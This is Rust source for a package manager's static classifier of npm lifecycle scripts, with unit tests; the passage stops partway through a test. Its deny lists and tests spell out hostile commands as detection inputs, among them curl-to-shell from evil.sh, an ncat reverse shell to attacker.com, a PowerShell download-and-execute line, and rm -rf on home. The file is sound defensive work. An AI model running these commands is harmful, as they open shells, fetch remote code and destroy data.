//! Phase 46 P2 — Layer 1 static-gate classifier.
//!
//! Pure, deterministic classification of lifecycle-script bodies into
//! one of three tiers:
//!
//! - [`StaticTier::Red`] — body matches a hand-curated blocklist of
//!   dangerous patterns (pipe-to-shell, base64-decode-to-execution,
//!   nested package-manager installs, Unicode obfuscation,
//!   PowerShell `Invoke-Expression` style, `rm -rf` on `$HOME`,
//!   etc.). Blocks unconditionally; never reaches the LLM.
//! - [`StaticTier::Green`] — body is exactly one of a tightly-curated
//!   allowlist of pure local build steps (`node-gyp rebuild`, `tsc`,
//!   `prisma generate`, `husky install`, `electron-rebuild`, and
//!   relative-path `node foo.js` style). No network binary
//!   downloaders (D18).
//! - [`StaticTier::Amber`] — everything else, including compound
//!   commands that mix otherwise-green steps, network binary
//!   downloaders per D18, and novel patterns. Deferred to
//!   layers 2/3/4.
//!
//! The classifier NEVER changes execution semantics. P2 populates
//! `static_tier` on [`crate::triage::StaticTier`] call sites for UX
//! annotation only; auto-execution of greens is gated on P5 (sandbox)
//! and P6 (tier-aware auto-run) per the D20 ordering rule.
//!
//! Only `Green | Amber | Red` are emitted here; `AmberLlm` is reserved
//! for P8 and is set by the LLM triage harness, not by static
//! classification.
//!
//! ## Algorithm (per §4.1 of the Phase 46 plan, with the review-round
//! ordering refinement)
//!
//! 1. **Raw-string red prefilter** for markers that can survive or
//!    evade tokenization — Unicode control characters (RTL overrides,
//!    zero-width joiners, BOM) and PowerShell literals
//!    (`Invoke-Expression`, `FromBase64String`, `Add-MpPreference`).
//!    These are checked on the raw UTF-8 string before we ever call
//!    [`shlex::split`].
//! 2. **Normalize shell operators, then tokenize.** `shlex` splits on
//!    whitespace with POSIX quoting but does NOT recognize shell
//!    operators — it leaves `|`, `>`, `>>`, `&&`, `||`, etc. embedded
//!    in tokens when there is no surrounding whitespace (empirically:
//!    `curl url|sh` tokenizes as `["curl", "url|sh"]`). Before
//!    tokenizing we run a quote-aware pass that pads every unquoted
//!    operator with spaces so `shlex::split` can do its normal job.
//!    Parse failure (unmatched quotes, etc.) → Amber — the classifier
//!    fails closed. Empty input → Amber.
//! 3. **Tokenized red checks** — scan the token stream for dangerous
//!    commands (pipe-to-shell, `eval`, `node -e`, nested PM installs,
//!    `rm -rf` on dangerous targets, etc.). This runs BEFORE the
//!    compound-to-amber fallback so that constructs like `curl … | sh`
//!    correctly end up Red rather than Amber.
//! 4. **Compound detection** — any compound operator token (`&&`,
//!    `||`, `;`, `|`, `>`, `>>`, `<`, `<<`, `&`, subshell parens, or
//!    an embedded `` ` ``/`$(` inside a token) → Amber. Compounds of
//!    otherwise-green commands are deliberately amber: approving one
//!    green + one hidden red in the same body would be a silent
//!    bypass.
//! 5. **Green allowlist** — an exact match against a short, curated
//!    set of single-command token shapes.
//! 6. **Fallback** → Amber. Novel-but-uninteresting scripts land here
//!    by design; the user's explicit `lpm approve-scripts` review is
//!    the gate that moves them forward.

use crate::triage::StaticTier;

/// Classify a single lifecycle-script body into a static tier.
///
/// The input is expected to be the **raw value** of one lifecycle
/// phase (`preinstall` / `install` / `postinstall`) exactly as it
/// appears in a package's `package.json`. Callers that need to
/// classify multiple phases should classify each independently and
/// aggregate worst-wins (Red > AmberLlm > Amber > Green) at the call
/// site — the classifier itself is scoped to a single command string.
///
/// Pure and deterministic: same input → same output across runs,
/// machines, and LPM versions (as long as the rule set hasn't been
/// edited).
pub fn classify(script: &str) -> StaticTier {
    // Empty / whitespace-only bodies don't run anything; treat as
    // Amber (the caller probably should have short-circuited already,
    // but fail conservative rather than silently green).
    if script.trim().is_empty() {
        return StaticTier::Amber;
    }

    // Step 1 — raw-string red prefilter.
    if contains_unicode_control_chars(script) || contains_powershell_red_literal(script) {
        return StaticTier::Red;
    }

    // Step 2 — normalize shell operators + tokenize. `shlex` only
    // splits on whitespace (with POSIX quoting); it does NOT
    // recognize shell operators. Empirically, `curl url|sh`
    // tokenizes as `["curl", "url|sh"]` (the `|` stays embedded),
    // which would silently downclass `curl … | sh` to Amber via the
    // compound-detection fallback. To fix, pad unquoted operators
    // with whitespace BEFORE handing the string to shlex. Parse
    // failure (unmatched quotes, etc.) → Amber, so malformed scripts
    // can't slip into Green.
    let normalized = normalize_operators(script);
    let tokens: Vec<String> = match shlex::split(&normalized) {
        Some(t) if !t.is_empty() => t,
        _ => return StaticTier::Amber,
    };

    // Step 3 — tokenized red checks. MUST run before the compound
    // fallback so `curl … | sh` doesn't degrade to Amber.
    if tokens_match_red(&tokens) {
        return StaticTier::Red;
    }

    // Step 4 — compound fallback.
    if tokens_are_compound(&tokens) {
        return StaticTier::Amber;
    }

    // Step 5 — green allowlist.
    if tokens_match_green(&tokens) {
        return StaticTier::Green;
    }

    // Step 6 — default.
    StaticTier::Amber
}

// ─────────────────────────────────────────────────────────────────────
// Step 1 — raw-string prefilter
// ─────────────────────────────────────────────────────────────────────

/// Check for Unicode code points that enable bidi / direction
/// obfuscation inside otherwise-innocuous-looking script text. These
/// are never legitimately needed in a postinstall script body; a
/// maintainer who ships one is either mistaken or malicious, and
/// either way the script needs human review.
///
/// Covers:
/// - `U+200B..U+200F` — zero-width space / non-joiner / joiner +
///   left-to-right mark / right-to-left mark.
/// - `U+202A..U+202E` — bidirectional embedding / override controls
///   (the "Trojan Source" attack class).
/// - `U+2066..U+2069` — LRI / RLI / FSI / PDI isolates.
/// - `U+FEFF` — zero-width no-break space / BOM.
fn contains_unicode_control_chars(s: &str) -> bool {
    s.chars().any(|c| {
        let cp = c as u32;
        (0x200B..=0x200F).contains(&cp)
            || (0x202A..=0x202E).contains(&cp)
            || (0x2066..=0x2069).contains(&cp)
            || cp == 0xFEFF
    })
}

/// Check the raw (case-insensitive) script for PowerShell constructs
/// that are the common malware shape: `Invoke-Expression` (aliased as
/// `iex`), `FromBase64String`, `Add-MpPreference`. These survive
/// tokenization intact but a substring check is cheaper and equally
/// specific.
///
/// The bare `iex` token (PowerShell alias for `Invoke-Expression`) is
/// intentionally handled in [`tokens_match_red`] instead — checking
/// `iex` as a substring would false-positive on English words like
/// "complex" and "regex".
fn contains_powershell_red_literal(s: &str) -> bool {
    const LITERALS_LC: &[&str] = &["invoke-expression", "frombase64string", "add-mppreference"];
    let lower = s.to_ascii_lowercase();
    LITERALS_LC.iter().any(|lit| lower.contains(lit))
}

// ─────────────────────────────────────────────────────────────────────
// Step 2 — operator normalization (quote-aware)
// ─────────────────────────────────────────────────────────────────────

/// Pad every UNQUOTED shell operator with surrounding whitespace so
/// the downstream [`shlex::split`] produces standalone operator
/// tokens.
///
/// `shlex` handles POSIX word-splitting + quoting but does NOT
/// recognize shell operators. Without this pre-pass, `curl url|sh`
/// tokenizes as `["curl", "url|sh"]` (the `|` stays glued to the URL)
/// and the tokenized red check for pipe-to-shell never fires — the
/// script silently downclasses to Amber via the generic compound
/// fallback, violating the "red wins over compound" contract.
///
/// The walker tracks single-quote / double-quote / backslash escape
/// state so we don't touch operator characters that appear inside a
/// quoted string (those are literal content, not operators).
///
/// Recognized two-char operators (parsed as a unit so `>>` doesn't
/// become `> >`): `&&`, `||`, `>>`, `<<`.
///
/// Recognized single-char operators: `|`, `&`, `;`, `<`, `>`, `(`,
/// `)`.
///
/// Everything else (including `{`, `}`, brace-expansion, and process
/// substitution `<(…)`) is left untouched; this is a deliberately
/// conservative list focused on the operators that gate the red
/// patterns in §4.1 of the plan.
fn normalize_operators(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 2);
    let mut chars = s.chars().peekable();
    let mut in_single_quote = false;
    let mut in_double_quote = false;

    while let Some(c) = chars.next() {
        // Backslash escapes the next char ONLY outside single quotes
        // (POSIX: inside `'…'`, backslash is literal).
        if c == '\\' && !in_single_quote {
            out.push(c);
            if let Some(next) = chars.next() {
                out.push(next);
            }
            continue;
        }

        if c == '\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
            out.push(c);
            continue;
        }
        if c == '"' && !in_single_quote {
            in_double_quote = !in_double_quote;
            out.push(c);
            continue;
        }

        if in_single_quote || in_double_quote {
            out.push(c);
            continue;
        }

        // Unquoted region — look for operators to pad.
        match c {
            '|' | '&' | '<' | '>' => {
                let two_char = matches!(
                    (c, chars.peek().copied()),
                    ('|', Some('|')) | ('&', Some('&')) | ('<', Some('<')) | ('>', Some('>'))
                );
                out.push(' ');
                out.push(c);
                if two_char {
                    out.push(chars.next().expect("peeked"));
                }
                out.push(' ');
            }
            ';' | '(' | ')' => {
                out.push(' ');
                out.push(c);
                out.push(' ');
            }
            _ => out.push(c),
        }
    }

    out
}

// ─────────────────────────────────────────────────────────────────────
// Step 3 — tokenized red checks
// ─────────────────────────────────────────────────────────────────────

fn tokens_match_red(tokens: &[String]) -> bool {
    if any_token_is_red_command(tokens) {
        return true;
    }
    if has_node_eval(tokens) {
        return true;
    }
    if has_pipe_to_shell(tokens) {
        return true;
    }
    if has_nested_package_manager(tokens) {
        return true;
    }
    if has_dangerous_rm(tokens) {
        return true;
    }
    if has_dangerous_chmod(tokens) {
        return true;
    }
    if has_dangerous_redirect(tokens) {
        return true;
    }
    false
}

/// Standalone commands that are always red no matter what comes after
/// them. Case-insensitive because `iex` is a PowerShell alias and
/// pwsh is case-insensitive; the others are checked against their
/// canonical lowercase spellings out of an abundance of caution.
fn any_token_is_red_command(tokens: &[String]) -> bool {
    tokens.iter().any(|t| {
        let lc = t.to_ascii_lowercase();
        matches!(lc.as_str(), "iex" | "nc" | "netcat" | "ncat" | "eval")
    })
}

/// `node -e '…'` / `node --eval '…'` — a small-surface RCE primitive
/// indistinguishable from malware when it shows up in a postinstall.
/// Requires the `-e` / `--eval` flag to be **adjacent** to `node` so
/// `node --other-flag -e` still trips (defensive against argument
/// reordering) but we don't false-positive on a random `-e` floating
/// elsewhere in the token stream.
fn has_node_eval(tokens: &[String]) -> bool {
    for (i, t) in tokens.iter().enumerate() {
        if t != "node" {
            continue;
        }
        for follower in tokens.iter().skip(i + 1) {
            if is_compound_op(follower) {
                break;
            }
            if follower == "-e" || follower == "--eval" {
                return true;
            }
            // Keep scanning past other flags (e.g. `node --no-warnings -e`).
            if !follower.starts_with('-') {
                break;
            }
        }
    }
    false
}

/// `curl … | sh` / `wget … | bash` / `base64 -d … | sh`. We look for a
/// `|` pipe operator whose RHS is a shell, and whose LHS contains
/// either a fetcher (`curl` / `wget` / `fetch`) or a `base64 -d` /
/// `base64 --decode`.
fn has_pipe_to_shell(tokens: &[String]) -> bool {
    const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish"];

    for (i, t) in tokens.iter().enumerate() {
        if t != "|" {
            continue;
        }
        let Some(next) = tokens.get(i + 1) else {
            continue;
        };
        if !SHELLS.contains(&next.as_str()) {
            continue;
        }
        let prior = &tokens[..i];
        let has_fetcher = prior
            .iter()
            .any(|p| matches!(p.as_str(), "curl" | "wget" | "fetch"));
        let has_base64_decode = prior
            .windows(2)
            .any(|w| w[0] == "base64" && matches!(w[1].as_str(), "-d" | "--decode"));
        if has_fetcher || has_base64_decode {
            return true;
        }
    }
    false
}

/// Nested package-manager install: the postinstall of package A
/// invoking `npm install B` / `pip install C` / etc. Always red —
/// the outer install has already resolved + audited its dependency
/// graph; a postinstall that reaches for another PM is actively
/// trying to run un-audited code.
fn has_nested_package_manager(tokens: &[String]) -> bool {
    // (command, allowed install verbs)
    const PAIRS: &[(&str, &[&str])] = &[
        ("npm", &["install", "i", "add"]),
        ("pnpm", &["install", "i", "add"]),
        ("yarn", &["add", "install"]),
        ("bun", &["add", "install"]),
        ("lpm", &["install", "i", "add"]),
        ("pip", &["install"]),
        ("pip3", &["install"]),
        ("gem", &["install"]),
        ("cargo", &["install"]),
        ("brew", &["install"]),
    ];
    tokens.windows(2).any(|w| {
        PAIRS
            .iter()
            .any(|(cmd, verbs)| w[0] == *cmd && verbs.contains(&w[1].as_str()))
    })
}

/// `rm -rf ~` / `rm -rf /` / `rm -rf $HOME` / `rm -rf *` and close
/// variants. We require BOTH `-r` and `-f` (in any flag spelling)
/// before considering targets — `rm foo.txt` without `-r` is not in
/// this red class.
fn has_dangerous_rm(tokens: &[String]) -> bool {
    for (i, t) in tokens.iter().enumerate() {
        if t != "rm" {
            continue;
        }
        let mut saw_r = false;
        let mut saw_f = false;
        let mut targets: Vec<&str> = Vec::new();
        for follower in tokens.iter().skip(i + 1) {
            if is_compound_op(follower) {
                break;
            }
            if let Some(flag) = follower.strip_prefix('-') {
                if flag.is_empty() || flag == "-" {
                    continue;
                }
                // Long-form `--recursive` / `--force`.
                if flag == "-recursive" || flag == "recursive" {
                    saw_r = true;
                    continue;
                }
                if flag == "-force" || flag == "force" {
                    saw_f = true;
                    continue;
                }
                // Short-form clusters like `-rf`, `-fr`, `-Rf`.
                for c in flag.chars() {
                    if c == 'r' || c == 'R' {
                        saw_r = true;
                    }
                    if c == 'f' {
                        saw_f = true;
                    }
                }
                continue;
            }
            targets.push(follower.as_str());
        }
        if !(saw_r && saw_f) {
            continue;
        }
        if targets.iter().any(|t| is_dangerous_rm_target(t)) {
            return true;
        }
    }
    false
}

fn is_dangerous_rm_target(target: &str) -> bool {
    // Exact matches for the canonical dangerous targets.
    if matches!(target, "/" | "~" | "*" | "/*" | "~/" | "~/*" | "./*") {
        return true;
    }
    // Home-dir-anchored — `~`, `$HOME`, `${HOME}`, `${HOME:-/root}`.
    if target.starts_with('~') || target.starts_with("$HOME") || target.starts_with("${HOME") {
        return true;
    }
    // Any absolute path is dangerous — a postinstall should never be
    // rm -rf'ing outside the package directory.
    if target.starts_with('/') {
        return true;
    }
    // Bare glob that'd expand in the CWD (typically the project dir).
    if target == "*" {
        return true;
    }
    false
}

/// `chmod +x` / `chmod 777` applied to a target outside the package
/// directory. Conservative: we treat any absolute path, `~`-anchored
/// path, or `$HOME`-anchored path as "outside" — we can't prove
/// anything further from the script text alone. Relative paths skip
/// the red classification (they might still land in Amber via the
/// generic fallback).
fn has_dangerous_chmod(tokens: &[String]) -> bool {
    for (i, t) in tokens.iter().enumerate() {
        if t != "chmod" {
            continue;
        }
        let mut saw_dangerous_mode = false;
        let mut targets: Vec<&str> = Vec::new();
        for follower in tokens.iter().skip(i + 1) {
            if is_compound_op(follower) {
                break;
            }
            if is_dangerous_chmod_mode(follower) {
                saw_dangerous_mode = true;
                continue;
            }
            if follower.starts_with('-') {
                // Some chmod implementations accept flags like `-R`;
                // treat as opaque and keep scanning for the target.
                continue;
            }
            targets.push(follower.as_str());
        }
        if !saw_dangerous_mode {
            continue;
        }
        if targets.iter().any(|t| is_outside_package_target(t)) {
            return true;
        }
    }
    false
}

fn is_dangerous_chmod_mode(m: &str) -> bool {
    // `+x`, `a+x`, `u+x`, `ugo+x`, `755`, `777`, leading-zero forms.
    if m == "+x" {
        return true;
    }
    if m.ends_with("+x") && m.len() <= 5 {
        // Short symbolic modes like `a+x`, `u+x`, `ugo+x`.
        return true;
    }
    matches!(m, "777" | "0777" | "755" | "0755")
}

fn is_outside_package_target(target: &str) -> bool {
    target.starts_with('~')
        || target.starts_with('/')
        || target.starts_with("$HOME")
        || target.starts_with("${HOME")
}

/// `>> ~/.bashrc` / `>> ~/.ssh/authorized_keys` / `> /etc/...` —
/// persistence-establishing redirects into user dotfiles or privileged
/// system paths. A postinstall writing into these locations is
/// malware-shaped regardless of what's being written.
fn has_dangerous_redirect(tokens: &[String]) -> bool {
    for (i, t) in tokens.iter().enumerate() {
        if t != ">>" && t != ">" {
            continue;
        }
        let Some(target) = tokens.get(i + 1) else {
            continue;
        };
        if is_dangerous_redirect_target(target) {
            return true;
        }
    }
    false
}

fn is_dangerous_redirect_target(target: &str) -> bool {
    const EXACT: &[&str] = &[
        "~/.bashrc",
        "~/.bash_profile",
        "~/.zshrc",
        "~/.zprofile",
        "~/.zshenv",
        "~/.profile",
        "~/.bash_login",
        "~/.bash_logout",
    ];
    if EXACT.contains(&target) {
        return true;
    }
    if target.starts_with("~/.ssh") {
        return true;
    }
    if target.starts_with("/etc/") || target.starts_with("/root/") {
        return true;
    }
    // `$HOME/.bashrc` and friends.
    if target.starts_with("$HOME/.") || target.starts_with("${HOME}/.") {
        return true;
    }
    false
}

// ─────────────────────────────────────────────────────────────────────
// Step 4 — compound detection
// ─────────────────────────────────────────────────────────────────────

/// A compound operator token. `shlex` doesn't understand shell
/// operators, so these appear as regular tokens (e.g. `"&&"`, `"|"`,
/// `">"`); we detect them by exact match. Subshell parens and backtick
/// command-substitution sit as **part of** tokens (since shlex treats
/// them as ordinary characters), so we also look for `$(` and `` ` ``
/// inside token contents.
fn is_compound_op(t: &str) -> bool {
    match t {
        "&&" | "||" | ";" | "|" | ">" | ">>" | "<" | "<<" | "&" | "(" | ")" => true,
        _ => t.contains("$(") || t.contains('`'),
    }
}

fn tokens_are_compound(tokens: &[String]) -> bool {
    tokens.iter().any(|t| is_compound_op(t))
}

// ─────────────────────────────────────────────────────────────────────
// Step 5 — green allowlist
// ─────────────────────────────────────────────────────────────────────

fn tokens_match_green(tokens: &[String]) -> bool {
    match tokens.first().map(String::as_str) {
        Some("node-gyp") => matches_node_gyp(tokens),
        Some("electron-rebuild") => tokens.len() == 1,
        Some("tsc") => matches_tsc(tokens),
        Some("prisma") => matches_prisma(tokens),
        Some("husky") => matches_husky(tokens),
        Some("node") => matches_node_relative(tokens),
        _ => false,
    }
}

/// `node-gyp rebuild` with optional `--release` / `--debug`.
fn matches_node_gyp(tokens: &[String]) -> bool {
    if tokens.len() < 2 || tokens[1] != "rebuild" {
        return false;
    }
    tokens
        .iter()
        .skip(2)
        .all(|t| t == "--release" || t == "--debug")
}

/// `tsc`, `tsc --build`, `tsc -b`, `tsc -p <relative>`,
/// `tsc --project <relative>`.
fn matches_tsc(tokens: &[String]) -> bool {
    match tokens.len() {
        1 => true,
        2 => matches!(tokens[1].as_str(), "--build" | "-b"),
        3 => matches!(tokens[1].as_str(), "-p" | "--project") && is_safe_relative_path(&tokens[2]),
        _ => false,
    }
}

/// `prisma generate`.
fn matches_prisma(tokens: &[String]) -> bool {
    tokens.len() == 2 && tokens[1] == "generate"
}

/// `husky` (v9+ form) or `husky install` (v8 form).
fn matches_husky(tokens: &[String]) -> bool {
    match tokens.len() {
        1 => true,
        2 => tokens[1] == "install",
        _ => false,
    }
}

/// `node <relative>.js` (or `.cjs` / `.mjs`) where `<relative>` is a
/// non-escaping path inside the package directory AND the basename is
/// not `install.js` / `postinstall.js` (those are the binary-fetcher
/// convention and tier amber — the amber exception wins per the plan
/// doc update).
fn matches_node_relative(tokens: &[String]) -> bool {
    if tokens.len() != 2 {
        return false;
    }
    let path = tokens[1].as_str();
    if !is_safe_relative_path(path) {
        return false;
    }
    let has_js_ext = path.ends_with(".js") || path.ends_with(".cjs") || path.ends_with(".mjs");
    if !has_js_ext {
        return false;
    }
    let basename = path.rsplit('/').next().unwrap_or(path);
    if matches!(basename, "install.js" | "postinstall.js") {
        return false;
    }
    true
}

/// A path is "safe relative" if it points inside the package
/// directory without absolute-path / home-dir / env-var shortcuts
/// and without `..` escape segments.
fn is_safe_relative_path(p: &str) -> bool {
    if p.is_empty()
        || p.starts_with('/')
        || p.starts_with('~')
        || p.starts_with('$')
        || p.contains('\\')
    {
        return false;
    }
    p.split('/').all(|seg| seg != "..")
}

// ─────────────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn tier(script: &str) -> StaticTier {
        classify(script)
    }

    // ── Green allowlist ──────────────────────────────────────────────

    #[test]
    fn green_tsc_variants() {
        assert_eq!(tier("tsc"), StaticTier::Green);
        assert_eq!(tier("tsc -b"), StaticTier::Green);
        assert_eq!(tier("tsc --build"), StaticTier::Green);
        assert_eq!(tier("tsc -p ./tsconfig.json"), StaticTier::Green);
        assert_eq!(tier("tsc --project src/tsconfig.json"), StaticTier::Green);
    }

    #[test]
    fn green_node_gyp() {
        assert_eq!(tier("node-gyp rebuild"), StaticTier::Green);
        assert_eq!(tier("node-gyp rebuild --release"), StaticTier::Green);
        assert_eq!(tier("node-gyp rebuild --debug"), StaticTier::Green);
        assert_eq!(
            tier("node-gyp rebuild --release --debug"),
            StaticTier::Green
        );
    }

    #[test]
    fn green_electron_rebuild_bare_only() {
        assert_eq!(tier("electron-rebuild"), StaticTier::Green);
        // Args push to Amber — we can widen if corpus demands it.
        assert_eq!(tier("electron-rebuild -f"), StaticTier::Amber);
    }

    #[test]
    fn green_husky_both_forms() {
        assert_eq!(tier("husky"), StaticTier::Green);
        assert_eq!(tier("husky install"), StaticTier::Green);
    }

    #[test]
    fn green_prisma_generate() {
        assert_eq!(tier("prisma generate"), StaticTier::Green);
    }

    #[test]
    fn green_node_relative_paths() {
        assert_eq!(tier("node build.js"), StaticTier::Green);
        assert_eq!(tier("node ./scripts/build.js"), StaticTier::Green);
        assert_eq!(tier("node lib/helper.mjs"), StaticTier::Green);
        assert_eq!(tier("node ./tools/gen.cjs"), StaticTier::Green);
    }

    #[test]
    fn amber_node_install_js_exception_wins() {
        // The plan-doc update locks this: install.js / postinstall.js
        // are the binary-fetcher convention and must NOT be green.
        assert_eq!(tier("node install.js"), StaticTier::Amber);
        assert_eq!(tier("node postinstall.js"), StaticTier::Amber);
        assert_eq!(tier("node ./install.js"), StaticTier::Amber);
        assert_eq!(tier("node scripts/install.js"), StaticTier::Amber);
    }

    #[test]
    fn amber_node_escaping_path() {
        assert_eq!(tier("node ../other/build.js"), StaticTier::Amber);
        assert_eq!(tier("node /abs/path.js"), StaticTier::Amber);
        assert_eq!(tier("node ~/build.js"), StaticTier::Amber);
        assert_eq!(tier("node $HOME/build.js"), StaticTier::Amber);
    }

    #[test]
    fn amber_node_without_js_extension() {
        assert_eq!(tier("node build"), StaticTier::Amber);
        assert_eq!(tier("node ./script"), StaticTier::Amber);
    }

    #[test]
    fn amber_node_with_extra_args() {
        // More-than-two-token forms are not green (conservative).
        assert_eq!(tier("node build.js --port 3000"), StaticTier::Amber);
    }

    // ── Red: prefilter (Unicode + PowerShell literals) ──────────────

    #[test]
    fn red_unicode_rtl_override() {
        // U+202E RIGHT-TO-LEVEL OVERRIDE — the "Trojan Source" signature.
        let s = "echo hi\u{202E}rm -rf /";
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn red_unicode_zero_width_joiner() {
        let s = "tsc\u{200D}";
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn red_unicode_bom_in_body() {
        let s = "tsc\u{FEFF}";
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn red_powershell_invoke_expression() {
        let s = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')";
        assert_eq!(tier(s), StaticTier::Red);
        // Case-insensitive match.
        assert_eq!(tier("invoke-expression $something"), StaticTier::Red);
    }

    #[test]
    fn red_powershell_from_base64_string() {
        assert_eq!(
            tier("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('x'))"),
            StaticTier::Red
        );
    }

    #[test]
    fn red_powershell_add_mppreference() {
        assert_eq!(
            tier("Add-MpPreference -ExclusionPath C:\\Users\\evil"),
            StaticTier::Red
        );
    }

    #[test]
    fn red_iex_as_bare_token() {
        assert_eq!(tier("iex $payload"), StaticTier::Red);
    }

    #[test]
    fn red_iex_substring_does_not_false_positive() {
        // These should NOT be red — the word contains "iex" as a
        // substring of a longer English token.
        assert_eq!(tier("complex"), StaticTier::Amber);
        assert_eq!(tier("regex"), StaticTier::Amber);
    }

    // ── Red: tokenized dangerous commands ───────────────────────────

    #[test]
    fn red_eval_bare() {
        assert_eq!(tier("eval $MALICIOUS"), StaticTier::Red);
    }

    #[test]
    fn red_node_dash_e() {
        assert_eq!(
            tier("node -e 'require(\"fs\").unlink(\"/etc/passwd\")'"),
            StaticTier::Red
        );
    }

    #[test]
    fn red_node_long_eval() {
        assert_eq!(tier("node --eval 'console.log(1)'"), StaticTier::Red);
    }

    #[test]
    fn red_node_eval_with_preceding_flags() {
        // `node --no-warnings -e '...'` should still trip.
        assert_eq!(
            tier("node --no-warnings -e 'console.log(1)'"),
            StaticTier::Red
        );
    }

    #[test]
    fn red_nc_netcat() {
        assert_eq!(tier("nc -l 8080"), StaticTier::Red);
        assert_eq!(tier("netcat attacker.com 4444"), StaticTier::Red);
        assert_eq!(tier("ncat -e /bin/sh attacker.com 4444"), StaticTier::Red);
    }

    // ── Red: pipe-to-shell (must win over compound) ─────────────────

    #[test]
    fn red_curl_pipe_sh() {
        assert_eq!(tier("curl https://evil.sh | sh"), StaticTier::Red);
    }

    #[test]
    fn red_curl_pipe_bash() {
        assert_eq!(tier("curl -fsSL https://evil.sh | bash"), StaticTier::Red);
    }

    #[test]
    fn red_wget_pipe_shell() {
        assert_eq!(tier("wget -O - https://evil.sh | sh"), StaticTier::Red);
    }

    #[test]
    fn red_base64_decode_pipe_shell() {
        assert_eq!(tier("base64 -d payload | sh"), StaticTier::Red);
        assert_eq!(tier("base64 --decode blob | bash"), StaticTier::Red);
    }

    #[test]
    fn red_wins_over_compound_fallback() {
        // The archetypal case: `curl … | sh`. The `|` operator would
        // otherwise short-circuit to Amber via the compound check —
        // we explicitly test here that red runs FIRST.
        let s = "curl https://x | sh";
        assert_eq!(tier(s), StaticTier::Red, "red must win over compound");
    }

    // ── Red: no-space operator forms (regression for review-round
    //         finding: shlex leaves unspaced operators embedded in
    //         tokens, so classify MUST normalize before tokenizing) ─

    #[test]
    fn red_curl_pipe_sh_no_space() {
        assert_eq!(tier("curl https://evil.sh|sh"), StaticTier::Red);
    }

    #[test]
    fn red_base64_decode_pipe_sh_no_space() {
        assert_eq!(tier("base64 -d payload|sh"), StaticTier::Red);
    }

    #[test]
    fn red_redirect_no_space() {
        assert_eq!(tier("echo hi>~/.bashrc"), StaticTier::Red);
        assert_eq!(tier("echo hi>>~/.ssh/authorized_keys"), StaticTier::Red);
        assert_eq!(tier("echo x>/etc/pam.d/sudo"), StaticTier::Red);
    }

    #[test]
    fn amber_compound_no_space() {
        // Compound operators with no surrounding whitespace must still
        // be detected as compound (not green, not a novel command).
        assert_eq!(tier("tsc&&husky install"), StaticTier::Amber);
        assert_eq!(tier("tsc;prisma generate"), StaticTier::Amber);
        assert_eq!(tier("tsc||true"), StaticTier::Amber);
    }

    // ── Normalizer: quoted operator chars must NOT be padded ────────

    #[test]
    fn normalizer_leaves_quoted_operators_alone() {
        // A single-quoted literal containing `|` is content, not an
        // operator. Must remain a single token and NOT trip the
        // pipe-to-shell detector.
        assert_eq!(tier("echo 'a|b|c'"), StaticTier::Amber);
        // Same for double-quoted.
        assert_eq!(tier("echo \"a>b\""), StaticTier::Amber);
        // An escape sequence must also be preserved.
        assert_eq!(tier("echo a\\|b"), StaticTier::Amber);
    }

    #[test]
    fn normalizer_preserves_quoted_pipe_payload() {
        // If a curl URL happens to contain `|` inside quotes, we
        // should NOT false-positive red — the `|` is content.
        // (Contrived; real URLs rarely contain `|`, but the quote
        // semantics must hold.)
        let s = "curl 'https://x.example/foo|bar'";
        // No `|` appears as an operator, no `sh` follows; amber.
        assert_eq!(tier(s), StaticTier::Amber);
    }

    #[test]
    fn normalizer_handles_two_char_operators() {
        // Explicit coverage: `>>` must be recognized as one operator,
        // not two `>` tokens (downstream `has_dangerous_redirect`
        // expects the `>>` token form).
        assert_eq!(tier("echo x>>~/.bashrc"), StaticTier::Red);
        // `||` and `&&` become standalone compound tokens.
        assert_eq!(tier("tsc||true"), StaticTier::Amber);
        assert_eq!(tier("tsc&&prisma generate"), StaticTier::Amber);
    }

    // ── Red: nested package managers ────────────────────────────────

    #[test]
    fn red_npm_install_nested() {
        assert_eq!(tier("npm install malware"), StaticTier::Red);
        assert_eq!(tier("npm i malware"), StaticTier::Red);
    }

    #[test]
    fn red_pnpm_yarn_bun_lpm_nested() {
        assert_eq!(tier("pnpm install x"), StaticTier::Red);
        assert_eq!(tier("yarn add x"), StaticTier::Red);
        assert_eq!(tier("bun add x"), StaticTier::Red);
        assert_eq!(tier("lpm install x"), StaticTier::Red);
    }

    #[test]
    fn red_pip_gem_cargo_brew_nested() {
        assert_eq!(tier("pip install requests"), StaticTier::Red);
        assert_eq!(tier("pip3 install requests"), StaticTier::Red);
        assert_eq!(tier("gem install rails"), StaticTier::Red);
        assert_eq!(tier("cargo install ripgrep"), StaticTier::Red);
        assert_eq!(tier("brew install thing"), StaticTier::Red);
    }

    #[test]
    fn amber_npm_run_script_not_install() {
        // `npm run build` is NOT a nested PM install; should be amber.
        assert_eq!(tier("npm run build"), StaticTier::Amber);
    }

    // ── Red: rm -rf on dangerous targets ────────────────────────────

    #[test]
    fn red_rm_rf_dangerous_targets() {
        assert_eq!(tier("rm -rf ~"), StaticTier::Red);
        assert_eq!(tier("rm -rf /"), StaticTier::Red);
        assert_eq!(tier("rm -rf $HOME"), StaticTier::Red);
        assert_eq!(tier("rm -rf ${HOME}"), StaticTier::Red);
        assert_eq!(tier("rm -rf ~/.config"), StaticTier::Red);
        assert_eq!(tier("rm -rf /etc/something"), StaticTier::Red);
    }

    #[test]
    fn red_rm_rf_flag_spellings() {
        assert_eq!(tier("rm -rf ~"), StaticTier::Red);
        assert_eq!(tier("rm -fr ~"), StaticTier::Red);
        assert_eq!(tier("rm -r -f ~"), StaticTier::Red);
        assert_eq!(tier("rm -f -r ~"), StaticTier::Red);
        assert_eq!(tier("rm --recursive --force ~"), StaticTier::Red);
    }

    #[test]
    fn amber_rm_rf_relative_target() {
        // Relative targets stay amber — we can't statically prove
        // containment but they're also not in the red class.
        assert_eq!(tier("rm -rf node_modules"), StaticTier::Amber);
        assert_eq!(tier("rm -rf dist"), StaticTier::Amber);
    }

    #[test]
    fn amber_rm_without_force_and_recursive() {
